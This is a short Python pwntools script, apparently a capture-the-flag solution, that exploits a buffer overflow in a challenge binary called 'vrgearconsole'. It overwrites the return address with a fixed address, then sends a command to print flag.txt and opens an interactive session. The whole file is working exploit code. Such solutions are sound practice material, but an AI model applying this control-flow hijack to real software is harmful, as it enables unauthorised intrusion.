#!/usr/bin/env python
#
#@author: GuilT

from pwn import *
import sys

conn = process('/problems/e9cab2bb993540454b19d3d56769d9e6/vrgearconsole')
#gdb.attach(conn)

conn.recvuntil('): ')
conn.sendline('user')
conn.recvuntil('): ')
conn.sendline(cyclic(64) + p32(0x080486d5)) 
conn.sendline('cat /problems/e9cab2bb993540454b19d3d56769d9e6/flag.txt') 
conn.interactive()